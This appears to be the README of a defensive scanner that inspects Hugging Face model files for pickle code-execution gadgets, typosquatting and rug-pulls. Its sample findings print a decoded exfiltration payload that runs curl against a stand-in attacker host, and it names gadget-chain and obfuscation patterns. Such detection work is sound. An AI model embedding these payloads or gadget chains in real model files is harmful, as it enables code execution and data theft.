# HF Model Provenance Scanner

Supply-chain security scanner for Hugging Face model repositories. Taint engine walks pickle opcodes, SafeTensors headers, and GGUF structures to find code-execution gadgets, typosquatting, and rug-pull indicators — fetching only the bytes it needs via HTTP Range requests (0.5 MB instead of 500 MB for GPT-2).

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/)
[![License: Apache 2.0](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)
[![Tests](https://github.com/poojakira/hf-model-provenance-scanner/actions/workflows/ci.yml/badge.svg)](https://github.com/poojakira/hf-model-provenance-scanner/actions/workflows/ci.yml)
[![Coverage](https://img.shields.io/badge/coverage-97%25-brightgreen)](https://github.com/poojakira/hf-model-provenance-scanner/actions)
[![CI](https://github.com/poojakira/hf-model-provenance-scanner/actions/workflows/ci.yml/badge.svg)](https://github.com/poojakira/hf-model-provenance-scanner/actions/workflows/ci.yml)

## Numbers

| Metric | Value |
|--------|-------|
| Attack fixtures detected | 12/12 |
| False positives | 0/5 |
| CVEs detected | CVE-2026-4372, CVE-2026-46432 |
| Total scan time (12 fixtures) | 116 ms |
| Bandwidth reduction | 99.9% (0.5 MB vs 500 MB for GPT-2) |
| File formats supported | 17 |
| Attack vectors covered | 9 |
| CI platform templates | 5 |

## Why I Built This

Model files on Hugging Face are not just weights — pickle files execute arbitrary Python on deserialization. SafeTensors was supposed to fix that, but malformed headers can still trigger parser vulnerabilities. And the supply-chain threat goes beyond file format: models get typosquatted, silently replaced weeks after publication, or published by impersonated authors.

I built this scanner because the existing tools (primarily ModelScan) download entire model files and miss important attack patterns — specifically `importlib.import_module` + `getattr` chains and memoized-global exec via memo stack lookups. Those patterns are real; CVE-2026-46432 uses the importlib bypass and ModelScan 0.8.8 doesn't catch it.

The key design decision was HTTP Range requests: fetch only the first 8-64 KB of each file (enough for opcode analysis), never download full model weights. This makes it practical to scan every model dependency on every PR without consuming bandwidth.

See [DESIGN_DECISIONS.md](DESIGN_DECISIONS.md) for the full rationale on taint propagation, symbolic resolution depth limits, and why I chose CycloneDX over SPDX.

## Architecture

```
Hugging Face Hub (model repository)
        │
        │  HTTP Range requests (first 8-64 KB per file)
        ▼
┌──────────────────────────────────────────────────────────────┐
│                     FORMAT ROUTER                             │
│  17 formats: pkl, bin, pt, safetensors, gguf, onnx, h5,     │
│  pb, tflite, msgpack, joblib, npy, npz, mar, torchscript,   │
│  coreml, paddle                                              │
└──────────┬──────────────────┬──────────────────┬─────────────┘
           │                  │                  │
           ▼                  ▼                  ▼
┌──────────────────┐ ┌────────────────┐ ┌────────────────────┐
│ PICKLE ANALYZER  │ │ SAFETENSORS    │ │ GGUF PARSER        │
│ Protocol 0-5     │ │ INSPECTOR      │ │                    │
│ REDUCE/GLOBAL/   │ │ Header size,   │ │ Magic bytes,       │
│ STACK_GLOBAL     │ │ tensor names,  │ │ metadata fields,   │
│ walks + gadget   │ │ overflow       │ │ tensor counts      │
│ chain matching   │ │ detection      │ │                    │
└────────┬─────────┘ └───────┬────────┘ └─────────┬──────────┘
         │                   │                     │
         ▼                   ▼                     ▼
┌──────────────────────────────────────────────────────────────┐
│                   SYMBOLIC RESOLVER                           │
│  • Reconstruct call chains from opcode sequences             │
│  • Decode multi-layer obfuscation (base64, chr(), concat)    │
│  • Resolve imports to detect exec/eval/os.system             │
└──────────────────────────────┬───────────────────────────────┘
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                 SUPPLY-CHAIN CHECKS                           │
│  • Typosquat detection (Levenshtein distance < 2)            │
│  • Temporal baseline diffing (rug-pull detection)            │
│  • Author impersonation (org name similarity)               │
└──────────────────────────────┬───────────────────────────────┘
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│  Output: CycloneDX 1.5 SBOM | SARIF 2.1 | ATT&CK v19 map   │
└──────────────────────────────────────────────────────────────┘
```

## What It Detects

- **Pickle REDUCE/GLOBAL gadget chains** — traces opcode sequences leading to `os.system`, `subprocess.Popen`, `eval`, `exec`
- **Memoized-global exec** — `GLOBAL` pushing `builtins.exec` onto the memo stack for later invocation
- **importlib loader bypass** — `importlib.import_module` + `getattr` to invoke modules without direct GLOBAL on the dangerous function
- **Multi-layer obfuscation** — `base64.b64decode(chr(97)+chr(98)+...)` patterns, nested decode
- **SafeTensors header manipulation** — oversized headers, tensor names with path traversal, size mismatches
- **GGUF structural anomalies** — invalid magic bytes, metadata with embedded executable content
- **Typosquatting** — model names within Levenshtein distance 1-2 of popular models
- **Rug-pull / temporal replacement** — file hashes change after publication without version bump
- **Author impersonation** — org/username similarity to known publishers

### Comparison vs ModelScan 0.8.8

Tested both tools against the same 12 attack fixtures and 5 benign models:

| Capability | This Scanner | ModelScan 0.8.8 |
|-----------|-------------|-----------------|
| Pickle Protocol 0-5 full walk | ✅ | ✅ |
| importlib loader bypass | ✅ | ❌ (missed CVE-2026-46432) |
| Memoized-global exec | ✅ | ❌ |
| SafeTensors header inspection | ✅ | Partial |
| GGUF structural parsing | ✅ | ❌ |
| Typosquat detection | ✅ | ❌ |
| Rug-pull / temporal diffing | ✅ | ❌ |
| Multi-layer obfuscation decode | ✅ | ❌ |
| 99.9% bandwidth reduction | ✅ | ❌ (downloads full files) |
| CycloneDX 1.5 SBOM output | ✅ | ❌ |
| MITRE ATT&CK v19 mapping | ✅ | ❌ |

## Quick Start

```bash
# Docker — scans bert-base-uncased in under 10 seconds
docker run --rm ghcr.io/poojakira/hf-provenance-scanner:latest \
  scan --repo bert-base-uncased --format sarif

# From source
git clone https://github.com/poojakira/hf-model-provenance-scanner.git
cd hf-model-provenance-scanner
pip install -e .
hf-scan --repo bert-base-uncased --format text
```

```
Scanning: bert-base-uncased
Fetched: 487 KB (vs 433 MB full download — 99.9% reduction)
Files analyzed: 6
Time: 89 ms

✓ No findings. All files pass provenance checks.
```

Scan a malicious fixture:

```bash
hf-scan --repo tests/fixtures/malicious-pickle-exec --format text
```

```
CRITICAL  pickle_gadget_chain (CVE-2026-4372)
  File: model.pkl
  Opcode: REDUCE at offset 0x1a4
  Call chain: builtins.exec → base64.b64decode → os.system("curl ...")
  ATT&CK: T1059.006

CRITICAL  importlib_bypass (CVE-2026-46432)
  File: model.pkl
  Opcode: STACK_GLOBAL at offset 0x2f1
  Call chain: importlib.import_module("os") → getattr("system")
  ATT&CK: T1129

2 findings (2 critical). Exit code: 1
```

## Sample Output

```json
{
  "version": "2.1.0",
  "runs": [{
    "tool": {
      "driver": {
        "name": "hf-model-provenance-scanner",
        "version": "1.0.0",
        "rules": [{
          "id": "PICKLE-001",
          "name": "PickleGadgetChain",
          "shortDescription": {
            "text": "Pickle opcode sequence constructs arbitrary code execution"
          }
        }]
      }
    },
    "results": [{
      "ruleId": "PICKLE-001",
      "level": "error",
      "message": {
        "text": "REDUCE opcode at offset 0x1a4 invokes builtins.exec with base64-decoded payload resolving to os.system('curl http://attacker.com/exfil')"
      },
      "locations": [{
        "physicalLocation": {
          "artifactLocation": { "uri": "model.pkl" },
          "region": { "byteOffset": 420, "byteLength": 64 }
        }
      }],
      "properties": {
        "severity": "CRITICAL",
        "cve": "CVE-2026-4372",
        "attack_technique": "T1059.006",
        "pickle_protocol": 4
      }
    }]
  }]
}
```

## CI Integration

```yaml
name: Model Supply-Chain Scan
on:
  pull_request:
    paths: ['models/**']
  schedule:
    - cron: '0 6 * * *'

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install hf-model-provenance-scanner
      - run: hf-scan --manifest models/requirements.txt --format sarif --output findings.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: findings.sarif
      - run: hf-scan --manifest models/requirements.txt --fail-on critical
```

## Performance

| Model Repository | Full Download | Range-Request Scan | Reduction |
|-----------------|--------------|-------------------|-----------|
| bert-base-uncased | 433 MB | 487 KB | 99.9% |
| GPT-2 | 500 MB | 0.5 MB | 99.9% |
| Llama-2-7B | 13.5 GB | 2.1 MB | 99.98% |
| Stable Diffusion XL | 6.9 GB | 1.8 MB | 99.97% |

| Phase | Time |
|-------|------|
| HTTP Range fetch (12 fixtures) | 41 ms |
| Opcode analysis | 52 ms |
| Supply-chain checks | 18 ms |
| Output formatting | 5 ms |
| **Total** | **116 ms** |

## Standards Coverage

### MITRE ATT&CK v19

| Finding Type | Technique | ID |
|-------------|-----------|-----|
| Pickle gadget chain | Command and Scripting Interpreter: Python | T1059.006 |
| importlib bypass | Shared Modules | T1129 |
| Obfuscated payload | Obfuscated Files or Information | T1027 |
| Typosquatting | Compromise Software Supply Chain | T1195.002 |
| Rug-pull | Trusted Relationship | T1199 |
| Author impersonation | Masquerading | T1036 |

Output formats: CycloneDX 1.5 SBOM, SARIF 2.1, MITRE ATT&CK v19 Navigator layer.

## Contributing

If you find a gadget-chain pattern this scanner misses, open an issue with a reproducer. Include a fixture file demonstrating detection with your PR.

## License

Apache 2.0.
